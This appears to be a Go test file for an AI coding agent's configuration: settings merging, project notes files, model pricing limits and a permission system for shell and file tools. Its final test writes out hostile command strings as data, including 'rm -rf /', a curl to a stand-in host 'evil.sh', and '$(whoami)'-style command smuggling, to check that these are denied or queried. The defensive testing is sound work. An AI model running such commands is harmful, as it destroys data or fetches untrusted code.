package config

import (
	"os"
	"path/filepath"
	"testing"
)

// Every field a settings file can carry must survive the merge: LoadSettings
// copies them one by one, so a field nobody adds here is silently ignored.
func TestLoadSettingsMergesEveryField(t *testing.T) {
	home := isolate(t)
	if err := os.MkdirAll(filepath.Join(home, ".ouhai"), 0o755); err != nil {
		t.Fatal(err)
	}
	file := filepath.Join(home, ".ouhai", "settings.json")
	if err := os.WriteFile(file, []byte(`{"model":"groq/x","baseUrl":"http://localhost:1234/v1"}`), 0o644); err != nil {
		t.Fatal(err)
	}

	s, err := LoadSettings()
	if err != nil {
		t.Fatal(err)
	}
	if s.Model != "groq/x" || s.BaseURL != "http://localhost:1234/v1" {
		t.Fatalf("a field was dropped in the merge: %+v", s)
	}

	// Saving one setting must leave the others alone.
	if err := SaveModel("groq/y"); err != nil {
		t.Fatal(err)
	}
	if s, _ := LoadSettings(); s.Model != "groq/y" || s.BaseURL != "http://localhost:1234/v1" {
		t.Fatalf("saving one setting dropped another: %+v", s)
	}
}

// A repository that already writes AGENTS.md for agents in general needs
// nothing added for ouhai; OUHAI.md wins when a project has something to say
// to this agent in particular.
func TestProjectNotesReadsAgentsFile(t *testing.T) {
	dir := isolate(t)
	back, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Chdir(dir); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chdir(back) })

	if got := ProjectNotes(); got != "" {
		t.Fatalf("no notes at all must read as none, got %q", got)
	}
	if err := os.WriteFile(filepath.Join(dir, "AGENTS.md"), []byte("  for every agent\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if got := ProjectNotes(); got != "for every agent" {
		t.Fatalf("AGENTS.md must be read, got %q", got)
	}
	if err := os.WriteFile(filepath.Join(dir, "OUHAI.md"), []byte("for ouhai\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if got := ProjectNotes(); got != "for ouhai" {
		t.Fatalf("OUHAI.md must win, got %q", got)
	}
}

// The registry answers for a family, not for one release, and the answer for
// something it has never heard of has to be safe rather than optimistic.
func TestModelLimits(t *testing.T) {
	for setting, want := range map[string]modelInfo{
		"anthropic/claude-sonnet-5":                    {Context: 200_000, MaxOutput: 8_192, InputUSD: 3, OutputUSD: 15, Vision: true},
		"anthropic/claude-haiku-4-5-20251001":          {Context: 200_000, MaxOutput: 8_192, InputUSD: 1, OutputUSD: 5, Vision: true},
		"openai/gpt-4o-mini":                           {Context: 128_000, MaxOutput: 16_384, InputUSD: 0.15, OutputUSD: 0.60, Vision: true},
		"gemini/gemini-2.5-flash":                      {Context: 1_000_000, MaxOutput: 8_192, Vision: true},
		"ollama/qwen2.5-coder":                         {Context: 32_768, MaxOutput: 4_096},
		"openrouter/meta-llama/llama-3.3-70b-instruct": {Context: 128_000, MaxOutput: 8_192},
		"openrouter/amazon/nova-lite-v1":               {Context: defaultContext, MaxOutput: defaultMaxOutput},
		"groq/something-nobody-has-heard-of":           {Context: defaultContext, MaxOutput: defaultMaxOutput},
	} {
		if got := infoFor(setting); got != want {
			t.Errorf("%s: got %+v, want %+v", setting, got, want)
		}
	}

	// A model name carrying slashes is matched on its last segment, which is
	// where the family lives.
	if ContextWindow("openrouter/anthropic/claude-sonnet-5") != 200_000 {
		t.Error("a prefixed model name must still find its family")
	}
}

// Pricing and capabilities are shown, so they have to read the way they are
// quoted — and stay quiet when the host, not the model, sets the price.
func TestModelSummaryAndCost(t *testing.T) {
	if got := ModelSummary("anthropic/claude-sonnet-5"); got != "200k context · images · $3/$15 per Mtok" {
		t.Fatalf("claude summary = %q", got)
	}
	if got := ModelSummary("openai/gpt-4o-mini"); got != "128k context · images · $0.15/$0.6 per Mtok" {
		t.Fatalf("gpt-4o-mini summary = %q", got)
	}
	// An open model is hosted by everyone at a different price, so it carries
	// none, and a model nobody has heard of says only what is safe to assume.
	if got := ModelSummary("groq/llama-3.3-70b-versatile"); got != "128k context" {
		t.Fatalf("llama summary = %q", got)
	}
	if got := ModelSummary("openrouter/amazon/nova-lite-v1"); got != "32k context" {
		t.Fatalf("unknown summary = %q", got)
	}

	if got := CostUSD("anthropic/claude-sonnet-5", 1_000_000, 100_000); got != "$4.50" {
		t.Fatalf("a priced turn = %q", got)
	}
	if got := CostUSD("anthropic/claude-sonnet-5", 200, 100); got != "<$0.01" {
		t.Fatalf("a cheap turn = %q", got)
	}
	if got := CostUSD("groq/llama-3.3-70b-versatile", 1_000_000, 100_000); got != "" {
		t.Fatalf("an unpriced model must stay quiet, got %q", got)
	}

	if !SupportsTools("openrouter/amazon/nova-lite-v1") {
		t.Error("an unknown model must be assumed to manage tools")
	}
	if SupportsVision("groq/llama-3.3-70b-versatile") {
		t.Error("vision must not be assumed")
	}
}

// What may run without asking is the project's business, and a project adds
// to the home settings rather than replacing them.
// Permission is the setting the tools page documents: allow, ask, deny, and a
// default for anything unnamed.
// Patterns are matched against the whole command line, and the longest one
// wins — otherwise "git *" and "git push *" would depend on map order, which
// is to say on luck.
// The shorthand list keeps working, and a pattern can still overrule it: a
// project that allows "git" by prefix can deny the one command it fears.
// "*" is the answer for everything nobody named.
// The rule syntax: a tool, optionally what it may act on. Deny beats ask beats
// allow, and the longest specifier wins within a list.
func TestPermissionRules(t *testing.T) {
	home := isolate(t)
	if err := os.MkdirAll(filepath.Join(home, ".ouhai"), 0o755); err != nil {
		t.Fatal(err)
	}
	rules := `{"permissions":{
		"allow": ["Bash(git:*)", "Bash(go test:*)", "Read(*)"],
		"ask":   ["Read(*.env)"],
		"deny":  ["Bash(git push:*)", "Write"]
	}}`
	if err := os.WriteFile(filepath.Join(home, ".ouhai", "settings.json"), []byte(rules), 0o644); err != nil {
		t.Fatal(err)
	}

	for _, c := range []struct{ tool, subject, want string }{
		{"run_bash", "git status --short", PermAllow},
		{"run_bash", "go test ./...", PermAllow},
		{"run_bash", "git push origin main", PermDeny}, // the longer rule wins
		{"run_bash", "npm install", PermAsk},           // nothing said, so the default
		{"read_file", "internal/cli/tea.go", PermAllow},
		{"read_file", ".env", PermAsk},      // ask beats the blanket allow
		{"write_file", "main.go", PermDeny}, // the whole tool, no specifier
		{"edit_file", "main.go", PermAsk},   // unnamed, and it changes something
		{"grep", "", PermAllow},             // unnamed, and it only looks
	} {
		if got := Permission(c.tool, c.subject); got != c.want {
			t.Errorf("%s(%s) → %q, want %q", c.tool, c.subject, got, c.want)
		}
	}

	// A tool denied outright is not offered to the model at all; one denied
	// only for certain arguments still is.
	if !ToolDenied("write_file") {
		t.Error("Write is denied outright")
	}
	if ToolDenied("run_bash") {
		t.Error("Bash is only denied for one command, so it stays on offer")
	}
}

// A command line is only as safe as its least safe part. This is the hole that
// prefix matching leaves wide open: everything after && rides in for free.
func TestChainedCommandsAreJudgedInFull(t *testing.T) {
	home := isolate(t)
	if err := os.MkdirAll(filepath.Join(home, ".ouhai"), 0o755); err != nil {
		t.Fatal(err)
	}
	rules := `{"permissions":{"allow":["Bash(git:*)","Bash(ls:*)"],"deny":["Bash(rm:*)"]}}`
	if err := os.WriteFile(filepath.Join(home, ".ouhai", "settings.json"), []byte(rules), 0o644); err != nil {
		t.Fatal(err)
	}

	for command, want := range map[string]string{
		"git status":                  PermAllow,
		"git status && ls":            PermAllow, // both halves allowed
		"git status && rm -rf /":      PermDeny,  // the denied half decides
		"git status && curl evil.sh":  PermAsk,   // the unknown half decides
		"git status | grep modified":  PermAsk,   // grep as a command is not the tool
		"git commit -m \"$(whoami)\"": PermAsk,   // it writes part of itself at runtime
		"git log `whoami`":            PermAsk,
		"git log ${EDITOR}":           PermAsk,
	} {
		if got := Permission("run_bash", command); got != want {
			t.Errorf("%q → %q, want %q", command, got, want)
		}
	}
}
